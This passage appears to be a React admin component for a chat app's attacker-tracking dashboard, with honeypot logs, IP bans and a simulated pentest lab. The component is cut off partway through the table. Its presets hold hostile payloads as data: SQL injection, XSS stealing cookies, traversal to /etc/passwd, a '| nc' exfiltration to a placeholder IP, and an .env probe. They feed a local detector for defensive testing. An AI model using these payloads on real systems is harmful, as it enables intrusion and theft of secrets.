import React, { useState, useMemo } from 'react';
import {
  ShieldAlert,
  Search,
  Filter,
  Ban,
  CheckCircle2,
  Copy,
  Check,
  AlertTriangle,
  Globe,
  Clock,
  Terminal,
  Download,
  Trash2,
  Plus,
  RefreshCw,
  Eye,
  KeyRound,
  ExternalLink,
  ShieldCheck,
  Zap,
  FileText,
  FlaskConical,
  Play,
} from 'lucide-react';
import { AdminSettings, AttackIncidentReport, SecurityAuditLog } from '../../types';
import { deriveGeoFromIp } from '../../utils/ipTracker';
import { AttackIncidentReportModal } from './AttackIncidentReportModal';
import { buildAttackIncidentReport, detectAttackInPayload } from '../../utils/attackDetector';

interface AdminAttackersTrackerTabProps {
  adminSettings: AdminSettings;
  onUpdateAdminSettings: (newSettings: AdminSettings) => void;
}

export const AdminAttackersTrackerTab: React.FC<AdminAttackersTrackerTabProps> = ({
  adminSettings,
  onUpdateAdminSettings,
}) => {
  const [searchQuery, setSearchQuery] = useState('');
  const [filterType, setFilterType] = useState<'all' | 'sqli' | 'wrong_password' | 'cyber_attack'>('all');
  const [filterBannedOnly, setFilterBannedOnly] = useState(false);
  const [copiedIp, setCopiedIp] = useState<string | null>(null);
  const [newManualBanIp, setNewManualBanIp] = useState('');
  const [actionToast, setActionToast] = useState<{ text: string; type: 'success' | 'info' | 'warning' } | null>(null);
  const [inspectLog, setInspectLog] = useState<SecurityAuditLog | null>(null);
  const [selectedReport, setSelectedReport] = useState<AttackIncidentReport | null>(null);
  const [isReportModalOpen, setIsReportModalOpen] = useState(false);
  const [customTestPayload, setCustomTestPayload] = useState("' OR '1'='1");
  const [customTestEndpoint, setCustomTestEndpoint] = useState('/api/v1/auth/admin-login');

  const showToast = (text: string, type: 'success' | 'info' | 'warning' = 'success') => {
    setActionToast({ text, type });
    setTimeout(() => setActionToast(null), 3500);
  };

  // Extract all logs that correspond to attacker activity, honeypot events, or failed logins
  const attackerLogs = useMemo(() => {
    const logs = adminSettings.auditLogs || [];
    return logs.filter(
      (log) =>
        log.eventType === 'suspicious_activity' ||
        log.eventType === 'cyber_attack_blocked' ||
        log.eventType === 'login_failed' ||
        log.detail.toLowerCase().includes('honeypot') ||
        log.detail.toLowerCase().includes('unauthorized') ||
        log.detail.toLowerCase().includes('sql')
    );
  }, [adminSettings.auditLogs]);

  // Extract unique attacker IPs
  const uniqueAttackerIps = useMemo(() => {
    const set = new Set<string>();
    attackerLogs.forEach((log) => {
      // Clean IP string (remove port or notes in parens)
      const clean = log.ip.replace(/\s*\(.*?\)/, '').trim();
      if (clean) set.add(clean);
    });
    return Array.from(set);
  }, [attackerLogs]);

  // Filtered logs
  const filteredLogs = useMemo(() => {
    return attackerLogs.filter((log) => {
      const cleanIp = log.ip.replace(/\s*\(.*?\)/, '').trim();
      const isBanned = (adminSettings.bannedIps || []).includes(cleanIp);

      if (filterBannedOnly && !isBanned) return false;

      if (filterType === 'sqli') {
        const isSqli =
          log.threatType === 'sqli' ||
          log.detail.toLowerCase().includes('sql') ||
          log.detail.includes("' OR '1'='1");
        if (!isSqli) return false;
      } else if (filterType === 'wrong_password') {
        const isWrongPass =
          log.threatType === 'wrong_password' ||
          log.detail.toLowerCase().includes('unauthorized login') ||
          log.eventType === 'login_failed';
        if (!isWrongPass) return false;
      } else if (filterType === 'cyber_attack') {
        if (log.eventType !== 'cyber_attack_blocked') return false;
      }

      if (searchQuery.trim()) {
        const q = searchQuery.toLowerCase().trim();
        const matchesIp = log.ip.toLowerCase().includes(q);
        const matchesDetail = log.detail.toLowerCase().includes(q);
        const matchesUser = (log.attemptedUsername || '').toLowerCase().includes(q);
        const matchesPass = (log.attemptedPassword || '').toLowerCase().includes(q);
        const matchesCountry = (log.country || '').toLowerCase().includes(q);
        const matchesCity = (log.city || '').toLowerCase().includes(q);
        if (!matchesIp && !matchesDetail && !matchesUser && !matchesPass && !matchesCountry && !matchesCity) {
          return false;
        }
      }

      return true;
    });
  }, [attackerLogs, filterType, filterBannedOnly, searchQuery, adminSettings.bannedIps]);

  // Ban an attacker IP
  const handleBanIp = (rawIp: string) => {
    const cleanIp = rawIp.replace(/\s*\(.*?\)/, '').trim();
    if (!cleanIp) return;

    if ((adminSettings.bannedIps || []).includes(cleanIp)) {
      showToast(`IP ${cleanIp} is already on the firewall blacklist.`, 'info');
      return;
    }

    const updatedBanned = [...(adminSettings.bannedIps || []), cleanIp];
    const newLog: SecurityAuditLog = {
      id: 'log_ban_' + Date.now(),
      timestamp: Date.now(),
      ip: '127.0.0.1 (Admin Action)',
      eventType: 'suspicious_activity',
      factorReached: 1,
      detail: `FIREWALL ACTION: Attacker IP "${cleanIp}" has been blocked and banned from Chat Nexu.`,
    };

    onUpdateAdminSettings({
      ...adminSettings,
      bannedIps: updatedBanned,
      auditLogs: [newLog, ...(adminSettings.auditLogs || [])],
    });

    showToast(`IP ${cleanIp} permanently banned by administrator!`, 'success');
  };

  // Unban an IP
  const handleUnbanIp = (rawIp: string) => {
    const cleanIp = rawIp.replace(/\s*\(.*?\)/, '').trim();
    const updatedBanned = (adminSettings.bannedIps || []).filter((ip) => ip !== cleanIp);

    onUpdateAdminSettings({
      ...adminSettings,
      bannedIps: updatedBanned,
    });

    showToast(`IP ${cleanIp} removed from firewall blacklist.`, 'info');
  };

  // Copy IP to clipboard
  const handleCopy = (ipText: string) => {
    const cleanIp = ipText.replace(/\s*\(.*?\)/, '').trim();
    navigator.clipboard.writeText(cleanIp);
    setCopiedIp(cleanIp);
    setTimeout(() => setCopiedIp(null), 2000);
    showToast(`Copied ${cleanIp} to clipboard`, 'info');
  };

  // Handle manual IP addition to ban list
  const handleAddManualBan = (e: React.FormEvent) => {
    e.preventDefault();
    const clean = newManualBanIp.trim();
    if (!clean) return;

    handleBanIp(clean);
    setNewManualBanIp('');
  };

  // Export Attacker Log to CSV
  const handleExportCsv = () => {
    if (attackerLogs.length === 0) {
      showToast('No attacker logs available to export.', 'info');
      return;
    }

    const headers = ['Timestamp', 'IP Address', 'Threat Type', 'Attempted Username', 'Attempted Password/Payload', 'Location', 'Detail', 'Banned Status'];
    const rows = attackerLogs.map((log) => {
      const cleanIp = log.ip.replace(/\s*\(.*?\)/, '').trim();
      const isBanned = (adminSettings.bannedIps || []).includes(cleanIp) ? 'BANNED' : 'TRAPPED';
      const geo = deriveGeoFromIp(cleanIp);
      return [
        `"${new Date(log.timestamp).toISOString()}"`,
        `"${cleanIp}"`,
        `"${log.threatType || log.eventType}"`,
        `"${log.attemptedUsername || 'N/A'}"`,
        `"${(log.attemptedPassword || '').replace(/"/g, '""')}"`,
        `"${geo.city}, ${geo.country}"`,
        `"${log.detail.replace(/"/g, '""')}"`,
        `"${isBanned}"`,
      ].join(',');
    });

    const csvContent = 'data:text/csv;charset=utf-8,' + [headers.join(','), ...rows].join('\n');
    const encodedUri = encodeURI(csvContent);
    const link = document.createElement('a');
    link.setAttribute('href', encodedUri);
    link.setAttribute('download', `chat_nexu_attacker_ips_${new Date().toISOString().slice(0, 10)}.csv`);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    showToast('Attacker IP intelligence export downloaded as CSV!', 'success');
  };

  // Clear or reset audit logs
  const handleClearLogs = () => {
    if (!window.confirm('Are you sure you want to clear the attacker intrusion logs?')) return;
    const nonAttackerLogs = (adminSettings.auditLogs || []).filter(
      (log) => log.eventType === 'login_success' || log.eventType === 'password_changed' || log.eventType === '3fa_updated'
    );
    onUpdateAdminSettings({
      ...adminSettings,
      auditLogs: nonAttackerLogs,
    });
    showToast('Attacker intrusion logs cleared.', 'info');
  };

  // Simulate an attacker test event
  const handleSimulateAttacker = () => {
    const sampleIps = ['185.220.101.5', '91.240.118.172', '103.251.167.20', '45.33.32.156', '198.51.100.89'];
    const sampleUsers = ['admin', 'root', 'administrator', 'system', 'nexu_admin'];
    const samplePayloads = ["' OR '1'='1", 'admin1234', 'toor', 'password99!', "admin' --", '12345678'];
    
    const randomIp = sampleIps[Math.floor(Math.random() * sampleIps.length)];
    const randomUser = sampleUsers[Math.floor(Math.random() * sampleUsers.length)];
    const randomPayload = samplePayloads[Math.floor(Math.random() * samplePayloads.length)];
    const isSqli = randomPayload.includes("'");
    const geo = deriveGeoFromIp(randomIp);
    const threat = detectAttackInPayload(randomPayload, 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36');
    const incidentReport = buildAttackIncidentReport({
      rawPayload: randomPayload,
      source: 'login_probe',
      targetEndpoint: '/api/v1/auth/admin-login',
      ipInfo: {
        ip: randomIp,
        country: geo.country,
        city: geo.city,
        isp: geo.isp,
      },
      userAgent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)',
      threatDetails: threat || undefined,
      containmentStatus: 'TRAPPED_IN_HONEYPOT_SANDBOX',
    });

    const newLog: SecurityAuditLog = {
      id: 'log_sim_' + Date.now(),
      timestamp: Date.now(),
      ip: `${randomIp} (Honeypot Sandbox Trap)`,
      eventType: 'suspicious_activity',
      threatType: threat?.threatType || (isSqli ? 'sqli' : 'wrong_password'),
      attemptedUsername: randomUser,
      attemptedPassword: randomPayload,
      country: geo.country,
      city: geo.city,
      isp: geo.isp,
      userAgent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko)',
      factorReached: 1,
      detail: isSqli
        ? `Honeypot Trap Activated! Inbound SQL injection payload "${randomPayload}" intercepted from IP ${randomIp}. Diverted into decoy sandbox.`
        : `Honeypot Trap Activated! Unauthorized login attempt with username "${randomUser}" and password "${randomPayload}" intercepted from IP ${randomIp}. Diverted into decoy sandbox.`,
      incidentReport,
    };

    onUpdateAdminSettings({
      ...adminSettings,
      auditLogs: [newLog, ...(adminSettings.auditLogs || [])],
    });

    showToast(`Simulated attacker event generated from ${randomIp} (${geo.city})`, 'success');
  };

  // Open Full Forensic Incident Report
  const handleOpenReport = (log: SecurityAuditLog) => {
    if (log.incidentReport) {
      setSelectedReport(log.incidentReport);
    } else {
      const cleanIp = log.ip.replace(/\s*\(.*?\)/, '').trim();
      const geo = log.country && log.city ? { country: log.country, city: log.city, isp: log.isp || 'Commercial Provider' } : deriveGeoFromIp(cleanIp);
      const payload = log.attemptedPassword || log.attemptedUsername || 'probe_request';
      const threat = detectAttackInPayload(payload, log.userAgent || navigator.userAgent);
      const report = buildAttackIncidentReport({
        rawPayload: payload,
        source: 'login_probe',
        targetEndpoint: '/api/v1/auth/admin-login',
        ipInfo: {
          ip: cleanIp,
          country: geo.country,
          city: geo.city,
          isp: geo.isp,
        },
        userAgent: log.userAgent || navigator.userAgent,
        threatDetails: threat || undefined,
        containmentStatus: log.eventType === 'cyber_attack_blocked' ? 'BLOCKED_BY_WAF' : 'TRAPPED_IN_HONEYPOT_SANDBOX',
      });
      setSelectedReport(report);
    }
    setIsReportModalOpen(true);
  };

  // Execute Security Pre-Testing / Pentest Probe
  const handleRunPentestProbe = (payloadToTest: string, endpoint: string = '/api/v1/auth/admin-login') => {
    const cleanPayload = payloadToTest.trim();
    if (!cleanPayload) {
      showToast('Please enter an attack or testing payload to probe.', 'warning');
      return;
    }

    const sampleIps = ['198.51.100.84', '185.220.101.9', '91.240.118.210', '103.251.167.45', '45.33.32.99'];
    const testIp = sampleIps[Math.floor(Math.random() * sampleIps.length)];
    const geo = deriveGeoFromIp(testIp);

    const detected = detectAttackInPayload(cleanPayload, navigator.userAgent);
    const incidentReport = buildAttackIncidentReport({
      rawPayload: cleanPayload,
      source: 'pretesting_simulation',
      targetEndpoint: endpoint,
      ipInfo: {
        ip: testIp,
        country: geo.country,
        city: geo.city,
        isp: geo.isp,
      },
      userAgent: navigator.userAgent,
      threatDetails: detected || undefined,
      containmentStatus: detected ? 'BLOCKED_BY_WAF' : 'TRAPPED_IN_HONEYPOT_SANDBOX',
    });

    const newLog: SecurityAuditLog = {
      id: 'log_pentest_' + Date.now(),
      timestamp: Date.now(),
      ip: `${testIp} (Pre-Testing Lab Probe)`,
      eventType: detected ? 'cyber_attack_blocked' : 'suspicious_activity',
      threatType: detected?.threatType || 'probe',
      attemptedUsername: 'security_pentester',
      attemptedPassword: cleanPayload,
      country: geo.country,
      city: geo.city,
      isp: geo.isp,
      userAgent: navigator.userAgent,
      factorReached: 0,
      detail: detected
        ? `PRE-TESTING ATTACK DETECTED: Intercepted ${detected.methodName} payload against ${endpoint}. Payload: "${cleanPayload}". Security engine generated full forensic report.`
        : `PRE-TESTING PROBE INTERCEPTED: Custom penetration test request against ${endpoint}. Payload: "${cleanPayload}". Security engine generated full forensic report.`,
      incidentReport,
    };

    onUpdateAdminSettings({
      ...adminSettings,
      auditLogs: [newLog, ...(adminSettings.auditLogs || [])],
    });

    setSelectedReport(incidentReport);
    setIsReportModalOpen(true);
    showToast(`Attack probe executed & forensic incident report generated!`, 'success');
  };

  return (
    <div className="flex-1 p-4 sm:p-6 overflow-y-auto space-y-6">
      {/* Toast */}
      {actionToast && (
        <div
          className={`fixed bottom-6 right-6 z-50 px-4 py-3 rounded-xl shadow-xl text-xs font-bold flex items-center gap-2 border animate-in slide-in-from-bottom-3 ${
            actionToast.type === 'success'
              ? 'bg-emerald-950 text-emerald-200 border-emerald-700/60'
              : actionToast.type === 'warning'
              ? 'bg-rose-950 text-rose-200 border-rose-700/60'
              : 'bg-slate-900 text-slate-200 border-slate-700'
          }`}
        >
          <CheckCircle2 className="w-4 h-4 text-emerald-400" />
          <span>{actionToast.text}</span>
        </div>
      )}

      {/* Header Banner */}
      <div className="bg-gradient-to-r from-rose-950 via-slate-900 to-purple-950 text-white p-5 sm:p-6 rounded-2xl border border-rose-800/40 shadow-lg relative overflow-hidden">
        <div className="absolute right-0 top-0 w-80 h-full bg-radial from-rose-500/10 to-transparent pointer-events-none" />
        
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 relative z-10">
          <div className="flex items-start gap-3.5">
            <div className="w-12 h-12 rounded-xl bg-rose-600/20 border border-rose-500/40 flex items-center justify-center text-rose-400 shadow-inner shrink-0">
              <ShieldAlert className="w-6 h-6" />
            </div>
            <div>
              <div className="flex items-center gap-2 flex-wrap">
                <h2 className="text-lg font-black tracking-tight">
                  Attacker IP Intelligence &amp; Intrusion Radar
                </h2>
                <span className="px-2 py-0.5 rounded-full bg-rose-500/20 text-rose-300 text-[10px] font-extrabold border border-rose-500/40 uppercase">
                  Active Threat Defense
                </span>
                <span className="px-2 py-0.5 rounded-full bg-purple-500/20 text-purple-300 text-[10px] font-extrabold border border-purple-500/40 flex items-center gap-1">
                  <span className="w-1.5 h-1.5 rounded-full bg-purple-400 animate-ping" />
                  Honeypot Trap Online
                </span>
              </div>
              <p className="text-xs text-slate-300 mt-1 max-w-2xl leading-relaxed">
                Live inspection center for all intruder IP addresses. Anyone entering incorrect passwords or attacker commands (like SQL injection) is automatically trapped in the Decoy Sandbox while their real IP, credentials attempted, and geolocation telemetry are isolated here.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2 self-end sm:self-center shrink-0">
            <button
              type="button"
              onClick={handleSimulateAttacker}
              className="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-slate-200 text-xs font-bold rounded-xl border border-slate-700 transition-all flex items-center gap-1.5 cursor-pointer shadow-xs active:scale-95"
              title="Add a synthetic attacker attempt for testing"
            >
              <Zap className="w-3.5 h-3.5 text-amber-400" />
              <span>Simulate Attacker</span>
            </button>
            <button
              type="button"
              onClick={handleExportCsv}
              className="px-3.5 py-2 bg-rose-600 hover:bg-rose-500 text-white text-xs font-bold rounded-xl shadow-md transition-all flex items-center gap-1.5 cursor-pointer active:scale-95"
              title="Download full attacker IP blacklist and log in CSV format"
            >
              <Download className="w-3.5 h-3.5" />
              <span>Export CSV</span>
            </button>
          </div>
        </div>
      </div>

      {/* KPI Cards */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-3.5">
        <div className="bg-white p-4 rounded-xl border border-slate-200 shadow-xs">
          <div className="flex items-center justify-between text-slate-500 mb-1">
            <span className="text-xs font-semibold">Total Attacks Trapped</span>
            <ShieldAlert className="w-4 h-4 text-rose-600" />
          </div>
          <div className="text-2xl font-black text-slate-900">{attackerLogs.length}</div>
          <p className="text-[11px] text-slate-400 mt-0.5">Diverted to honeypot sandbox</p>
        </div>

        <div className="bg-white p-4 rounded-xl border border-slate-200 shadow-xs">
          <div className="flex items-center justify-between text-slate-500 mb-1">
            <span className="text-xs font-semibold">Unique Attacker IPs</span>
            <Globe className="w-4 h-4 text-purple-600" />
          </div>
          <div className="text-2xl font-black text-slate-900">{uniqueAttackerIps.length}</div>
          <p className="text-[11px] text-slate-400 mt-0.5">Distinct network sources</p>
        </div>

        <div className="bg-white p-4 rounded-xl border border-slate-200 shadow-xs">
          <div className="flex items-center justify-between text-slate-500 mb-1">
            <span className="text-xs font-semibold">Blacklisted IPs</span>
            <Ban className="w-4 h-4 text-rose-700" />
          </div>
          <div className="text-2xl font-black text-rose-600">
            {(adminSettings.bannedIps || []).length}
          </div>
          <p className="text-[11px] text-slate-400 mt-0.5">Blocked at firewall layer</p>
        </div>

        <div className="bg-white p-4 rounded-xl border border-slate-200 shadow-xs">
          <div className="flex items-center justify-between text-slate-500 mb-1">
            <span className="text-xs font-semibold">Real System Integrity</span>
            <ShieldCheck className="w-4 h-4 text-emerald-600" />
          </div>
          <div className="text-2xl font-black text-emerald-600">100%</div>
          <p className="text-[11px] text-slate-400 mt-0.5">Zero breaches &bull; Isolated</p>
        </div>
      </div>

      {/* 🔬 Security Pre-Testing & Attack Simulation Lab */}
      <div className="bg-gradient-to-br from-slate-900 via-indigo-950 to-slate-900 text-white p-5 rounded-2xl border border-indigo-700/50 shadow-xl space-y-4">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-3 border-b border-indigo-800/40">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl bg-indigo-600/30 border border-indigo-400/30 flex items-center justify-center text-indigo-300 shadow-inner">
              <FlaskConical className="w-5 h-5 text-indigo-300" />
            </div>
            <div>
              <div className="flex items-center gap-2 flex-wrap">
                <h3 className="font-black text-sm tracking-tight text-white">
                  Security Pre-Testing &amp; Attack Simulation Lab
                </h3>
                <span className="px-2 py-0.5 rounded-full bg-indigo-500/20 text-indigo-300 text-[10px] font-extrabold border border-indigo-400/40 uppercase">
                  SOC Analysis Engine
                </span>
                <span className="px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 text-[10px] font-extrabold border border-emerald-400/40 flex items-center gap-1">
                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse" />
                  Live Detection Armed
                </span>
              </div>
              <p className="text-xs text-indigo-200/80 mt-0.5">
                Detect, pre-test, and analyze website attacks — whether pre-testing vulnerability probes or live hacking attempts. Click any preset or enter custom test vectors below to generate a full detailed incident report on the attack method used.
              </p>
            </div>
          </div>
        </div>

        {/* Quick Pre-Testing Attack Presets */}
        <div>
          <div className="text-[11px] font-extrabold text-indigo-300 uppercase tracking-wider mb-2 flex items-center gap-1.5">
            <Zap className="w-3.5 h-3.5 text-amber-400" />
            <span>Instant Pre-Testing Attack Probes (Click to Launch &amp; Generate Detailed Report)</span>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2">
            {[
              {
                title: "SQLi: Auth Bypass",
                badge: "Tautology",
                payload: "' OR '1'='1",
                endpoint: "/api/v1/auth/admin-login",
                color: "bg-purple-950/70 border-purple-600/50 hover:bg-purple-900/80 text-purple-200",
              },
              {
                title: "SQLi: UNION Exfiltration",
                badge: "Data Dump",
                payload: "' UNION SELECT 1, table_name FROM information_schema.tables --",
                endpoint: "/api/v1/auth/admin-login",
                color: "bg-purple-950/70 border-purple-600/50 hover:bg-purple-900/80 text-purple-200",
              },
              {
                title: "XSS: Stored Script",
                badge: "Script Inject",
                payload: "<script>alert(document.cookie)</script>",
                endpoint: "/api/v1/rooms/global/messages",
                color: "bg-rose-950/70 border-rose-600/50 hover:bg-rose-900/80 text-rose-200",
              },
              {
                title: "Path Traversal: LFI",
                badge: "Arbitrary Read",
                payload: "../../../../etc/passwd",
                endpoint: "/api/v1/system/file-download",
                color: "bg-amber-950/70 border-amber-600/50 hover:bg-amber-900/80 text-amber-200",
              },
              {
                title: "RCE: Command Injection",
                badge: "Remote Shell",
                payload: "; cat /etc/passwd | nc 198.51.100.1 4444",
                endpoint: "/api/v1/system/network-ping",
                color: "bg-red-950/70 border-red-600/50 hover:bg-red-900/80 text-red-200",
              },
              {
                title: "Directory / Secret Fuzz",
                badge: "Asset Leak",
                payload: "/.env.production.local",
                endpoint: "/.env.production.local",
                color: "bg-orange-950/70 border-orange-600/50 hover:bg-orange-900/80 text-orange-200",
              },
              {
                title: "Scanner: sqlmap Probe",
                badge: "Tool Audit",
                payload: "sqlmap/1.8.3#stable (https://sqlmap.org)",
                endpoint: "/api/v1/auth/admin-login",
                color: "bg-blue-950/70 border-blue-600/50 hover:bg-blue-900/80 text-blue-200",
              },
              {
                title: "SSTI: Template Injection",
                badge: "Jinja/Twig Eval",
                payload: "{{7*7}}",
                endpoint: "/api/v1/email/render-preview",
                color: "bg-pink-950/70 border-pink-600/50 hover:bg-pink-900/80 text-pink-200",
              },
            ].map((preset, idx) => (
              <button
                key={idx}
                type="button"
                onClick={() => handleRunPentestProbe(preset.payload, preset.endpoint)}
                className={`p-2.5 rounded-xl border text-left transition-all cursor-pointer group hover:scale-[1.02] active:scale-[0.98] ${preset.color}`}
              >
                <div className="flex items-center justify-between gap-1 mb-1">
                  <span className="font-bold text-xs truncate text-white">{preset.title}</span>
                  <span className="text-[9px] px-1.5 py-0.5 rounded font-mono font-black uppercase bg-black/40 border border-white/10 text-white/90 shrink-0">
                    {preset.badge}
                  </span>
                </div>
                <div className="font-mono text-[10px] text-white/70 truncate bg-black/30 px-1.5 py-0.5 rounded">
                  {preset.payload}
                </div>
                <div className="mt-1.5 text-[10px] text-indigo-300/80 flex items-center gap-1 group-hover:text-white transition-colors font-semibold">
                  <Play className="w-3 h-3 text-amber-400 fill-amber-400" />
                  <span>Launch Pre-Test &amp; View Report &rarr;</span>
                </div>
              </button>
            ))}
          </div>
        </div>

        {/* Custom Pre-Testing Console */}
        <div className="bg-black/30 rounded-xl p-3.5 border border-indigo-800/40">
          <div className="text-[11px] font-bold text-indigo-200 mb-2 flex items-center justify-between">
            <span className="flex items-center gap-1.5">
              <Terminal className="w-3.5 h-3.5 text-indigo-400" />
              <span>Custom Attack / Pre-Testing Payload Probe</span>
            </span>
            <span className="text-[10px] text-slate-400">
              Full Detailed Forensic Breakdown on Attack Method
            </span>
          </div>

          <div className="flex flex-col md:flex-row gap-2">
            <div className="flex-1">
              <input
                type="text"
                value={customTestPayload}
                onChange={(e) => setCustomTestPayload(e.target.value)}
                placeholder="Enter attack script, SQL tautology, XSS tag, or path probe..."
                className="w-full px-3 py-2 bg-slate-950/90 border border-indigo-500/50 rounded-xl text-xs font-mono text-white placeholder-slate-500 focus:outline-none focus:ring-2 focus:ring-indigo-400"
              />
            </div>
            <div className="w-full md:w-60">
              <select
                value={customTestEndpoint}
                onChange={(e) => setCustomTestEndpoint(e.target.value)}
                className="w-full px-3 py-2 bg-slate-950/90 border border-indigo-500/50 rounded-xl text-xs font-mono text-white focus:outline-none focus:ring-2 focus:ring-indigo-400 cursor-pointer"
              >
                <option value="/api/v1/auth/admin-login">/api/v1/auth/admin-login</option>
                <option value="/api/v1/rooms/global/messages">/api/v1/rooms/global/messages</option>
                <option value="/api/v1/system/file-download">/api/v1/system/file-download</option>
                <option value="/api/v1/system/network-ping">/api/v1/system/network-ping</option>
                <option value="/.env.production.local">/.env.production.local</option>
                <option value="/admin/config.php">/admin/config.php</option>
              </select>
            </div>
            <button
              type="button"
              onClick={() => handleRunPentestProbe(customTestPayload, customTestEndpoint)}
              className="px-4 py-2 bg-gradient-to-r from-indigo-600 to-purple-600 hover:from-indigo-500 hover:to-purple-500 text-white font-extrabold text-xs rounded-xl shadow-lg transition-all flex items-center justify-center gap-1.5 cursor-pointer shrink-0 active:scale-95"
            >
              <FlaskConical className="w-4 h-4 text-amber-300" />
              <span>Execute Pre-Test &amp; Generate Report</span>
            </button>
          </div>
        </div>
      </div>

      {/* Manual Firewall Ban & Filter Controls */}
      <div className="bg-white p-4 sm:p-5 rounded-2xl border border-slate-200 shadow-xs space-y-4">
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-3 pb-3 border-b border-slate-100">
          {/* Quick Manual IP Ban Form */}
          <form onSubmit={handleAddManualBan} className="flex items-center gap-2 flex-1 max-w-md">
            <div className="relative flex-1">
              <Ban className="w-4 h-4 text-rose-500 absolute left-3 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                placeholder="Enter IP address to manually ban (e.g. 198.51.100.44)"
                value={newManualBanIp}
                onChange={(e) => setNewManualBanIp(e.target.value)}
                className="w-full pl-9 pr-3 py-2 text-xs border border-slate-300 rounded-xl focus:outline-none focus:ring-2 focus:ring-rose-500 bg-slate-50 text-slate-900 font-mono"
              />
            </div>
            <button
              type="submit"
              disabled={!newManualBanIp.trim()}
              className="px-3.5 py-2 bg-rose-600 hover:bg-rose-700 disabled:opacity-50 text-white text-xs font-bold rounded-xl transition-all flex items-center gap-1.5 cursor-pointer shrink-0"
            >
              <Plus className="w-3.5 h-3.5" />
              <span>Block IP</span>
            </button>
          </form>

          {/* Action buttons */}
          <div className="flex items-center gap-2 shrink-0">
            <button
              type="button"
              onClick={handleClearLogs}
              className="px-2.5 py-1.5 text-slate-500 hover:text-rose-600 hover:bg-rose-50 text-xs font-semibold rounded-lg transition-colors flex items-center gap-1 cursor-pointer"
            >
              <Trash2 className="w-3.5 h-3.5" />
              <span>Clear Log History</span>
            </button>
          </div>
        </div>

        {/* Filter bar */}
        <div className="flex flex-col sm:flex-row items-center justify-between gap-3">
          {/* Search box */}
          <div className="relative w-full sm:w-80">
            <Search className="w-4 h-4 text-slate-400 absolute left-3 top-1/2 -translate-y-1/2" />
            <input
              type="text"
              placeholder="Search by IP, password, command, or country..."
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className="w-full pl-9 pr-3 py-2 text-xs border border-slate-200 rounded-xl focus:outline-none focus:ring-2 focus:ring-sky-500 bg-slate-50"
            />
          </div>

          {/* Filter Pills */}
          <div className="flex items-center gap-1.5 overflow-x-auto w-full sm:w-auto pb-1 sm:pb-0">
            <button
              type="button"
              onClick={() => setFilterType('all')}
              className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer ${
                filterType === 'all'
                  ? 'bg-slate-900 text-white shadow-xs'
                  : 'bg-slate-100 text-slate-600 hover:bg-slate-200'
              }`}
            >
              All Threats ({attackerLogs.length})
            </button>

            <button
              type="button"
              onClick={() => setFilterType('sqli')}
              className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer ${
                filterType === 'sqli'
                  ? 'bg-purple-900 text-purple-100 shadow-xs'
                  : 'bg-purple-50 text-purple-700 hover:bg-purple-100'
              }`}
            >
              SQL Injection
            </button>

            <button
              type="button"
              onClick={() => setFilterType('wrong_password')}
              className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer ${
                filterType === 'wrong_password'
                  ? 'bg-amber-900 text-amber-100 shadow-xs'
                  : 'bg-amber-50 text-amber-800 hover:bg-amber-100'
              }`}
            >
              Wrong Password / Brute Force
            </button>

            <button
              type="button"
              onClick={() => setFilterBannedOnly(!filterBannedOnly)}
              className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center gap-1 ${
                filterBannedOnly
                  ? 'bg-rose-900 text-rose-100 shadow-xs'
                  : 'bg-slate-100 text-slate-600 hover:bg-slate-200'
              }`}
            >
              <Ban className="w-3 h-3" />
              <span>Banned Only</span>
            </button>
          </div>
        </div>
      </div>

      {/* Attacker Records Table */}
      <div className="bg-white rounded-2xl border border-slate-200 shadow-xs overflow-hidden">
        <div className="px-5 py-3.5 bg-slate-50 border-b border-slate-200 flex items-center justify-between">
          <div className="flex items-center gap-2">
            <ShieldAlert className="w-4 h-4 text-rose-600" />
            <h3 className="font-bold text-xs uppercase tracking-wider text-slate-700">
              Captured Attacker Network Activity ({filteredLogs.length})
            </h3>
          </div>
          <span className="text-[11px] text-slate-500">
            Real IP logging active &bull; Decoy container containment
          </span>
        </div>

        {filteredLogs.length === 0 ? (
          <div className="p-12 text-center text-slate-400 space-y-3">
            <div className="w-14 h-14 rounded-2xl bg-slate-100 flex items-center justify-center mx-auto text-slate-400">
              <ShieldCheck className="w-7 h-7 text-emerald-500" />
            </div>
            <p className="text-sm font-semibold text-slate-600">No attacker events matching filter</p>
            <p className="text-xs text-slate-400 max-w-sm mx-auto">
              Anytime someone inputs a wrong password or attacker command on the admin portal, their IP address and attempted credentials will appear right here.
            </p>
            <button
              type="button"
              onClick={handleSimulateAttacker}
              className="mt-2 px-3 py-1.5 bg-slate-900 hover:bg-slate-800 text-white text-xs font-bold rounded-lg cursor-pointer transition-colors"
            >
              Simulate Sample Inbound Attack
            </button>
          </div>
        ) : (
          <div className="overflow-x-auto">
            <table className="w-full text-left text-xs">
              <thead className="bg-slate-100/75 text-slate-600 font-bold border-b border-slate-200 text-[11px]">
                <tr>
                  <th className="py-3 px-4">Attacker IP &amp; Origin</th>
                  <th className="py-3 px-4">Threat Type</th>
                  <th className="py-3 px-4">Username Attempted</th>
                  <th className="py-3 px-4">Attempted Password / Command</th>
                  <th className="py-3 px-4">Captured Time</th>
                  <th className="py-3 px-4">Status &amp; Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-slate-100">
                {filteredLogs.map((log) => {
                  const cleanIp = log.ip.replace(/\s*\(.*?\)/, '').trim();
